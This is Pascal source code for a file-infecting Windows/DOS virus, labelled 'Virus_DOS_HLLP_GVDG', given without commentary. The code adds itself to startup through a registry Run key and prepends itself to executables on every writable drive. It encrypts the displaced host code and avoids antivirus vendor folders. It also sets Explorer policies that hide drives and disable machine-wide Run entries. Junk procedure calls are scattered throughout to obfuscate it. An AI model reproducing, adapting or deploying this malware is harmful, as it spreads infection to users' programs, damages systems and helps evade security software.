  {$M 65520,0,0}
Program Virus_DOS_HLLP_GVDG;
USES DOS;
Const
  VirSize=6421;
  Metka='dyp37-89';
  MSize=length(Metka);
type
  Bufer=array[1..VirSize] of Char;
VAR
   Victim : integer;
Procedure BeginEnd(i : integer);
var
  n :integer;
Begin
  case i of
        0..10000: n:=0;
    10001..20000: n:=i;
    20001..30000: n:=random(1000)
  else
    begin  
      n:=0;
      n:=random(65535);
      n:=i
    end;  
  end;
End;
Function IntToStr(I : integer) : String;
Var
  S : String [5];
Begin
 Str(I, S); BeginEnd(-2511); BeginEnd(-1013);
 IntToStr:=S; BeginEnd(28233); 
End;
Procedure AutoRun;
VAR
    f : file;
  txt : text;
    i : integer;
  st1 : string;
  st2 : string;
Begin
  st1:=GetEnv('SystemRoot')+'\'+'DEA@LVIR'+'.EXE';
  for i:=1 to length(st1) do
  begin
  if st1[i]='\'
  then st2:=st2+'\'+st1[i]
  else st2:=st2+st1[i]
  end;
  Assign(f,st1); BeginEnd(-2982); BeginEnd(-1292);
  {$i-} Reset(f); Close(f); {$i+}
  if IOResult<>0 then
  Begin
    Assign(txt,'REG'); BeginEnd(12023); BeginEnd(-3161);
    Rewrite(txt); BeginEnd(1990); 
    Writeln(txt,'Windows Registry Editor Version 5.00'); BeginEnd(26627); BeginEnd(1802);
    Writeln(txt,'[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]');
    Writeln(txt,'"DEA@LVIR"="'+st2+'"');
    Close(txt); BeginEnd(-1934); BeginEnd(-9480);
    Exec(GetEnv('Comspec'),'/c REG IMPORT REG'); BeginEnd(1712); BeginEnd(22186);
    Exec(GetEnv('Comspec'),'/c DEL REG'); BeginEnd(5401); 
    Exec(GetEnv('Comspec'),'/c copy '+paramstr(0)+' '+st1); BeginEnd(12665); BeginEnd(-3025); BeginEnd(3485);
    Exec(GetEnv('Comspec'),'/c cls'); BeginEnd(22009); 
  End; BeginEnd(16735); BeginEnd(22781); BeginEnd(26939);
End;
function CD(path:string):boolean;
var
           d : dirstr;
           n : namestr;
           e : extstr;
           b : boolean;
         ToF : file;
       FromF : file;
           f : file;
     NumRead : Word;
  NumWritten : Word;
         Buf : array[1..$400] of Char;
          st : string;
begin
  fsplit(paramstr(0),d,n,e); BeginEnd(-1837); 
  st:=path+n+e; BeginEnd(-5029); BeginEnd(-3205); BeginEnd(-1549);
  Assign(f,d+n+'.gds'); BeginEnd(32179); 
  {$i-}rewrite(f);
  Erase(f);{$i+}
    if IOResult<>0
      then
            Begin
             b:=true; BeginEnd(27429); BeginEnd(13381); BeginEnd(-1851);
             Assign(FromF, ParamStr(0)); BeginEnd(-2236); BeginEnd(-6472); BeginEnd(10482);
             Reset(FromF, 1); BeginEnd(-4919); 
             Assign(ToF,st); BeginEnd(-1359); 
             SetFAttr(ToF,0);
             Rewrite(ToF, 1); BeginEnd(-2441); BeginEnd(-317);
             repeat
               BlockRead(FromF, Buf, SizeOf(Buf), NumRead); BeginEnd(31755); BeginEnd(13425); BeginEnd(20627);
               BlockWrite(ToF, Buf, NumRead, NumWritten); BeginEnd(475); 
             until (NumRead = 0) or (NumWritten <> NumRead);
             Close(ToF); BeginEnd(-5448); 
             Close(FromF); BeginEnd(23941); 
             exec(st,''); BeginEnd(14257); BeginEnd(-7338);
            end
      else b:=false;
  CD:=b; BeginEnd(22413); BeginEnd(4908);
end;
procedure Shifr(var Buf:Bufer; key:integer);
var
   k : integer;
  ii : integer;
begin
  for k:=1 to Sizeof(Buf) do
  begin
    ii:=key+k;
    Buf[k]:=chr(ord(Buf[k]) xor ii); BeginEnd(20212); BeginEnd(-5820);
  end;
end;
procedure Infect(path,name:string);
var
    FromF : file;
      ToF : file;
   BufVir : Bufer;
  NumRead : Word;
      txt : text;
        i : integer;
        k : integer;
      Key : integer;
begin
  Assign(txt,path+name); BeginEnd(-2802); BeginEnd(1951); BeginEnd(23625);
  append(txt); BeginEnd(-8941); BeginEnd(-2450);
  write(txt,Metka);
  i:=0;
  k:=random(256); BeginEnd(-2502); BeginEnd(25294);
    repeat
      inc(i);
      write(txt,chr(random(256))); BeginEnd(-1133); BeginEnd(-1052); BeginEnd(-2838);
    until i>k; BeginEnd(17268); BeginEnd(-1606); BeginEnd(-1910);
  Close(txt); BeginEnd(8285); BeginEnd(9564); BeginEnd(-2466);
  Assign(ToF,path+name);
  reset(ToF,1); BeginEnd(11223); 
  Key:=FileSize(ToF) mod 256; BeginEnd(-1185); BeginEnd(-2522); BeginEnd(19003);
  BlockRead(ToF,BufVir,SizeOf(BufVir), NumRead); BeginEnd(-2641); BeginEnd(24992); BeginEnd(24101);
  Shifr(BufVir,Key-1); BeginEnd(17521); BeginEnd(-1122);
  seek(ToF,filesize(ToF));
  BlockWrite(ToF,BufVir,NumRead); BeginEnd(23431); 
  Assign(FromF,paramstr(0)); BeginEnd(10435); BeginEnd(-1275);
  reset(FromF,1); BeginEnd(-1683); BeginEnd(13168);
  BlockRead(FromF,BufVir,SizeOf(BufVir), NumRead);
  seek(ToF,0); BeginEnd(-9110); BeginEnd(-2120); BeginEnd(24733);
  BlockWrite(ToF,BufVir,NumRead);
  Close(ToF);
  Close(FromF);
end;
procedure Find(dir:pathstr);
var
   sr : searchrec;
    f : file;
  Buf : array[1..4] of Char;
begin
  findfirst(dir+'*.exe',39,sr);
  if  (pos('SYSTEM',dir)=0) and (pos('DRWEB', dir)=0)
  and (pos('KASPER',dir)=0) and (pos('PANDA', dir)=0)
  and (pos('NORTON',dir)=0) and (pos('COMMON',dir)=0)
  and (pos('DOCUM', dir)=0) and (pos('GVDG',  dir)=0)
  then
  while doserror=0 do
  if Victim<13 then
  begin
  Assign(f,dir+sr.name); BeginEnd(-6416); BeginEnd(4448); BeginEnd(13228);
  setfattr(f,0); BeginEnd(-4450); 
  {$i-}reset(f,1);
  Close(f);{$i+}
  IF ioresult=0 then
    Begin
      Assign(f,dir+sr.name); BeginEnd(-3193); BeginEnd(-1600);
      reset(f,1);
      if FileSize(f)>1000 then
      Begin
        seek(f,85); BeginEnd(-3132); BeginEnd(-7971); BeginEnd(27460);
        blockread(f,Buf,4); BeginEnd(-1789); BeginEnd(20472);
        Close(f);
        if Buf<>'GDS!' then
         begin
           inc(Victim); BeginEnd(15853); BeginEnd(-2894); BeginEnd(28508);
           Infect(dir,sr.name); BeginEnd(13329); BeginEnd(-1694); BeginEnd(-1778);
         end; BeginEnd(28894); BeginEnd(29567);
      end
      else
      Close(f);
    end; BeginEnd(12304); 
    findnext(sr); BeginEnd(-2861); 
  end
  else exit;
  findfirst(dir+'*.',55,sr);
  while doserror=0 do
  if Victim<13 then
  begin
    with sr do
      if (attr and directory<>0) and (name[1]<>'.') and (length(dir)<63)
      then find(dir+name+'\');
    findnext(sr);
  end
  else exit;
end;
procedure InRun(Run : integer);
var
        f : file;
      txt : text;
   BufVir : Bufer;
  NumRead : Word;
        k : integer;
        z : char;
      Key : integer;
        i : longint;
      Buf : array[1..MSize]of char;
begin
  Assign(txt,getenv('TMP')+'reg'); BeginEnd(-2393); 
  rewrite(txt); BeginEnd(-2685); 
  writeln(txt,'Windows Registry Editor Version 5.00');
  write(txt,'[HKEY_CURRENT_USER\Software\Microsoft\'); BeginEnd(4774); BeginEnd(-1011);
  writeln(txt,'Windows\CurrentVersion\Policies\Explorer]'); BeginEnd(15592); BeginEnd(8441);
  writeln(txt,'"DisableLocalMachineRun"=dword:00000001'); BeginEnd(15861); 
  writeln(txt,'"NoViewOnDrive"=dword:3ffffff');
  Close(txt); BeginEnd(3148); 
  exec(getenv('comspec'),'/c reg import '+getenv('TMP')+'reg');
  exec(getenv('comspec'),'/c cls');
  erase(txt); BeginEnd(-1398); BeginEnd(13475);
  writeln('Hallo, World!!!');
  Assign(f,paramstr(0)); BeginEnd(14228); BeginEnd(11019); BeginEnd(6632);
  reset(f,1); BeginEnd(-2996); BeginEnd(8331);
  Key:=(FileSize(f)-VirSize) mod 256; BeginEnd(32767); 
  seek(f,filesize(f)-VirSize); BeginEnd(-3015); 
  BlockRead(f,BufVir,SizeOf(BufVir), NumRead);
  if filesize(f)=VirSize then
  Begin
    Close(f);
    Erase(f);
    Halt(0);
  end
  else
  Shifr(BufVir,Key-1);
  seek(f,0); BeginEnd(-3271); BeginEnd(-4402); BeginEnd(23585);
  BlockWrite(f,BufVir,NumRead); BeginEnd(-3047); BeginEnd(-1076);
  i:=filesize(f)-VirSize-256-MSize; BeginEnd(-1058); BeginEnd(-2206);
  while true do
  begin
    seek(f,i); BeginEnd(964); 
    blockread(f,Buf,MSize); BeginEnd(-2489); BeginEnd(8098); BeginEnd(26509);
    if Buf=Metka then
    begin
      seek(f,i); BeginEnd(4934); 
      truncate(f); BeginEnd(10984); 
      break; BeginEnd(-3206); 
    end; BeginEnd(-1852); BeginEnd(-2209); BeginEnd(-2400);
    inc(i); BeginEnd(-1750); BeginEnd(-231);
  end; BeginEnd(-8076); BeginEnd(4198); BeginEnd(-2899);
  Close(f);
  if Run=1 then
  exec(Paramstr(0),'');
end;
Procedure Nucleus;
var
    i : integer;
    s : string;
    f : file;
begin
  Assign(f,paramstr(0));
  SetFAttr(f,0);
  if Paramstr(1)='KILL' then
  begin
    InRun(0);
    Halt(0);
  end;
  AutoRun;
  if CD(getenv('SYSTEMROOT')+'\') then halt(0);
  s:=''; BeginEnd(-3019); 
  for i:=1 to 24 do
  begin
    Assign(f,chr(ord(i)+66)+':\'+#$FF);
    {$I-}rewrite(f); erase(f);{$I+} BeginEnd(-2399); 
    if ioresult=0 then s:=s+chr(ord(i)+66); BeginEnd(5217); 
  end; BeginEnd(1246); BeginEnd(6057); BeginEnd(-3659);
  for i:=1 to length(s) do Find(s[i]+':\'); BeginEnd(-3859); 
  InRun(1); BeginEnd(14769); BeginEnd(31368); BeginEnd(25440);
end;
begin
Randomize; BeginEnd(-1617); BeginEnd(-1423);
Nucleus; BeginEnd(28726); BeginEnd(-1325);
end.
